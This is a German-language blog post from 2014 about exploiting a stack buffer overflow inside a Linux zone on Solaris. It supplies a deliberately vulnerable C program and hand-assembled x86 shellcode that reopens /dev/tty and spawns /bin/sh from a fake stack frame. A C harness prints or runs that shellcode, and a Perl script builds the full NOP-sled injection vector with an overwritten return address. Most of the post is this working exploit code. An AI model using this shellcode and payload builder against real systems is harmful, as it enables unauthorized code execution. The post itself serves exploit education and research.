---
title: "Solaris: Bufferoverflows in lx-Zones ausnutzen"
date: "2014-01-27"
categories: 
  - "exploits"
  - "pentest"
layout: post
---

In diesem Artikel wird gezeigt, dass es möglich ist, in einer Linux-Zone unter Solaris einen Shellcode auszuführen, wenn dieser einen bestimmten Aufbau hat.

Zunächst wird beispielhaft ein Programm gezeigt, dass eine Bufferoverflow-Schwachstelle hat. Anschließend wird ein Shellcode entwickelt, der die Besonderheiten der User-Level-Calls in einer lx-Zone unter Solaris berücksichtigt. Das wird erreicht, indem der lx_brandz.so.1 ein virtueller Stack untergeschoben wird, damit der Shellcode während des Aufrufs von exec() nicht verändert wird. Abschließend werden ein Programm und ein Script entwickelt, die zusammen einen kompletten Injection-Vector erzeugen.

# Das Opfer...

Um das Beispiel einfach zu halten, wird ein einfacher Stack-basierter Überlauf genutzt. Das angegriffene Programm wird nachfolgend gezeigt:

```c
#include <stdio.h>
#include <sys/mman.h>
#include <errno.h>

#define UNPROTECT_STACK
#define STACK_BEGIN 0x08046000
#define STACK_SIZE 8192
#define STACK_PERMISSIONS PROT_READ | PROT_WRITE | PROT_EXEC
```

Die Funktion `__get_esp()` wird über das Makro `TRACE_ESP` genutzt, um die Adresse des Stack auszugeben. Normalerweise steht in einem anzugreifenden Programm dieses Feature nicht zur Verfügung, daher kann es auch hier abgeschaltet werden. In einem solchen Fall kann der Wert des `%esp`\-Registers einfach über die Nutzung eines Debuggers ermittelt werden.

```c
unsigned long __get_esp() {
  __asm__("movl %esp,%eax");
}
#ifdef PRINT_ESP
#define TRACE_ESP(functionname) \
 (printf("%s at %%esp: 0x%08x\n", (functionname), __get_esp()))
#else
#define TRACE_ESP(functionname)
#endif
```

Aus Demonstrationszwecken wurde die Funktion `__gets()` programmiert, die sich jedoch in etwa wie `gets()` verhält. Der qualitative Unterschied ist, dass das Verhalten der Funktion beim Lesen von Binärdaten besser beeinflusst werden kann.

```c
/* dangerous: __gets is evil!!! never call this function!!! */
void __gets(char* ptr) {
 char c;
 while (fread(&c, sizeof(c), 1, stdin)) {
  if (c == '\n')
   break;
  else
   *ptr++ = c;
 }
 *ptr = '\0';
}
```

Der Angriff selbst richtet sich gegen die Funktion `do_work()`. Es wird ausgenutzt, dass `__gets()` in den Buffer name schreibt, ohne zu prüfen, ob genügend Platz im Buffer ist.

```c
void do_work() {
 char name[512];
 TRACE_ESP("do_work");
 printf("What's your name? ");
 __gets(name);
 printf("hello, %s\n", name);
}
```

Interessant ist im Hauptprogramm vor dem Aufruf von `do_work()` die Manipulation der Zugriffsrechte des Stacks. Hier ist es für den Interessierten möglich, zu testen, wie sich das Programm bei eingeschränkten Zugriffsrechten (insbesondere ohne `PROT_EXEC`) verhält.

```c
int main(void) {
#ifdef UNPROTECT_STACK
 if (0 != mprotect((void*)STACK_BEGIN,
       STACK_SIZE, STACK_PERMISSIONS)) {
  fprintf(stderr, "mprotect: %s\n", strerror(errno));
  return -1;
 }
#endif
 TRACE_ESP("main");
 do_work();
 return 1;
}
```

# Der Täter

Der Shellcode arbeitet in mehreren Schritten:

- Sprung zum Ende des Shellcodes (`call_position`) und wieder zurück an den Anfang. Damit liegt die Adresse des ersten Bytes nach dem call auf dem Stack. Diese wird dann in `%esi` gespeichert.
- Anlegen eines neuen Stackframes unterhalb des Shellcodes. Das Problem ist, dass in der Testumgebung (Solaris Brandz mit Linux) ein Aufruf von `int $0x80` in eine Anwendungsbibliothek (`lx_brandz.so.1`) weitergeleitet wird. Diese Funktionsaufrufe belegen natürlich Platz auf unserem Stack und überschreiben die Zeichenkette `"/bin/sh"` und die beiden Pointer `argv` und `env`. Durch das Erzeugen des neuen Stackframes werden die Daten vor dem Überschreiben geschützt.
- `stdin` schließen und wieder neu starten. Bei der Vorführung wird das Programm den Injection Vector (IV) per Pipe oder Eingabeumleitung lesen. Nach dem vollständigen Lesen des IV und anschließenden Starten von `/bin/sh` wird `read()` keine Daten mehr zu lesen haben, was die Shell als `EOF` interpretiert und sich beendet. Daher schließen wir die Pipe und öffnen `/dev/tty` als Dateideskriptor 0, was `stdin` entspricht.
- Ausführen von `/bin/sh`. Eine ausführliche Erklärung dieses Programmfragments findet sich in [Aleph One: Smashing The Stack For Fun And Profit. Phrack, Volume Seven, Issue Forty-Nine](http://www.phrack.com/issues.html?issue=49&id=14 "Smashing The Stack For Fun And Profit").

```c
char shellcode[] = 
  "\xeb\x43"      /*   jmp    0x804840d <call_position> */
  "\x5e"          /*   pop    %esi */
 /* create artificial stack begin */
  "\x89\xf4"      /*   mov    %esi, %esp */
  "\x89\xf5"      /*   mov  %esi, %ebp */
  "\x83\xed\x40"  /*   sub  $0x40, %ebp */
  "\x83\xec\x60"  /*   sub  $0x60, %esp */
 /* close stdin and reopen it */
  "\x56"          /*   push   %esi */
  "\x31\xc0"      /*   xor    %eax,%eax */
  "\xb0\x06"      /*   mov    $0x6,%al */
  "\x31\xdb"      /*   xor    %ebx,%ebx */
  "\xcd\x80"      /*   int    $0x80 */
  "\x5e"          /*   pop    %esi */
  "\x56"          /*   push   %esi */
  "\x31\xc0"      /*   xor    %eax,%eax */
  "\x88\x46\x0f"  /*   mov    %al,0x0f(%esi) */
  "\xb0\x05"      /*   mov    $0x5,%al */
  "\x8d\x5e\x07"  /*   lea    0x7(%esi),%ebx */
  "\x31\xc9"      /*   xor    %ecx,%ecx */
  "\xcd\x80"      /*   int    $0x80 */
  "\x5e"          /*   pop    %esi */
 /* exec /bin/sh (I copied the whole thing from shellcode.org) */
  "\x89\x76\x08"  /*   mov    %esi,0x8(%esi) */
  "\x31\xc0"      /*   xor    %eax,%eax */
  "\x88\x46\x07"  /*   mov    %al,0x7(%esi) */
  "\x89\x46\x0c"  /*   mov    %eax,0xc(%esi) */
  "\xb0\x0b"      /*   mov    $0xb,%al */
  "\x89\xf3"      /*   mov    %esi,%ebx */
  "\x8d\x4e\x08"  /*   lea    0x8(%esi),%ecx */
  "\x8d\x56\x0c"  /*   lea    0xc(%esi),%edx */
  "\xcd\x80"      /*   int    $0x80 */
  "\x31\xdb"      /*   xor    %ebx,%ebx */
  "\x89\xd8"      /*   mov    %ebx,%eax */
  "\x40"          /*   inc    %eax */
  "\xcd\x80"      /*   int    $0x80 */
  "\xe8\xb8\xff\xff\xff"  /*   call   start_of_exploit */
  "/bin/sh"
  "/dev/tty";
```

# `shellcode.c`

Wir nutzen nachfolgendes Programm, um den Shellcode auszugeben bzw. den Injection Vector zu konstruieren. Das Programm versteht die Parameter `-l` (Ausgeben der Länge des Shellcode) und `-x` (Ausführen des Shellcodes). Wenn man das Programm ohne Parameter ausführt, wird der Shellcode auf `stdout` ausgegeben.

Der Shellcode selbst sollte in einer Variable namens `shellcode` gespeichert sein, die wiederum in einer Headerdatei definiert ist. Diese Headerdatei wird -- ungewöhnlicherweise -- mitten innerhalb von main() eingebunden. Die Ursache dafür ist, dass der Shellcode davon ausgeht, sich innerhalb des Stacks zu befinden. Um den Shellcode zu testen, sollte man also eine möglichst realistische Umgebung schaffen und den Shellcode in einem lokalen Puffer speichern.

Auch hier möchte ich wieder auf die Möglichkeit hinweisen, die Verhaltensweise des Shellcodes bei einem mit `mprotect()` geschützten Stack auszuprobieren.

```c
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
 
int
main(int argc, char* argv[]) {
/* include shellcode buffer here, so that it is stored on the stack */
#include "own.c"
 if (argc == 1) {
  printf("%s", shellcode);
  return 0;
 }
 if (argc == 2 && 0 == strcmp(argv[1], "-l")) {
  printf("%d\n", strlen(shellcode));
  return 0;
 }
 if (argc == 2 && 0 == strcmp(argv[1], "-x")) {
  /* allow to execute code on the stack */
  mprotect((void*)0x08046000, 8192, PROT_READ | PROT_WRITE | PROT_EXEC);
  void (*code)() = (void(*)())shellcode;
  code();
  return -1;
 }
 fprintf(stderr, "Usage: %s [-l|-x]\n", argv[0]);
 return 1;
}
```

# `shellcode.pl`

Dieses Perl-Script ist ein Wrapper für das aus `shellcode.c` entstehende Programm, der den kompletten Injection Vector (IV) konstruiert. Der IV besteht aus folgenden Teilen:

- viele NOPs. Dieser Bereich wird zum NOP-Sliding genutzt, da wir uns hier nicht damit beschäftigen wollen, wie wir den Shellcode direkt bytegenau ansprechen können.
- Shellcode
- nochmal NOPs. Manchmal könnte es sinnvoll sein, den Shellcode etwas in den Bereich niedriger Adressen zu verschieben. Als Platzhalter bis zum Instruction Pointer dienen diese NOP-Befehle. EBP. Eine 4 Byte große Zahl, die die Basisadresse des nächsthöheren Stackframes ist. Da unser Shellcode einen neuen Stackframe anlegt, kann diese Zahl beliebig sein. EIP. Eine 4 Byte große Zahl, die die Adresse des ersten auszuführenden Befehls des IV ist. Den korrekten Wert dieser Adresse zu ermitteln bedeutet, sich einige Zeit mit einem Debugger zu beschäftigen. Ich möchte hier ebenfalls auf die Lektüre der sehr ausführlichen Texte des Phrack-Magazins verweisen. Das Script bekommt als Parameter die Länge des zu überschreibenden Puffers und die Anzahl der nach dem Shellcode einzufügenden NOPs übergeben. Wie man diese Zahlen ermittelt, wird an dieser Stelle ebenfalls nicht besprochen.
    
    Die Gesamtgröße des auf `stdout` ausgegebenen IV ist 8 Byte größer als die angegebene Pufferlänge (für EBP und EIP).
    
    ```perl
    #!/usr/bin/perl -w
    use strict;
     
    if (2 != scalar @ARGV) {
     die "./shellcode.pl  \n";
    }
     
    my $buffer_length = $ARGV[0];
    my $nop_length2 = $ARGV[1];
     
    binmode STDOUT;
     
    chomp (my $shellcode_length = \`./shellcode -l\`);
    my $shellcode = \`./shellcode\`;
    my $nop_length1 = $buffer_length - $shellcode_length;
    my $eip_recurrence=1;
     
    print STDERR "shellcode length: $shellcode_length bytes\n";
    print STDERR "buffer length:    $buffer_length bytes\n";
    print STDERR "nop sliding 1:    $nop_length1 bytes\n";
    print STDERR "nop sliding 2:    $nop_length2 bytes\n";
     
    my $eip = chr(0x20) . chr(0x75) . chr(0x04) . chr(0x08);
    my $ebp = $eip;
    
    my $nop_slide1 = (chr(0x90)x$nop_length1);
    my $nop_slide2 = (chr(0x90)x$nop_length2);
    my $iv = $nop_slide1 . $shellcode . $nop_slide2 . $ebp . ($eip x $eip_recurrence);
     
    print STDOUT $iv;
    ```
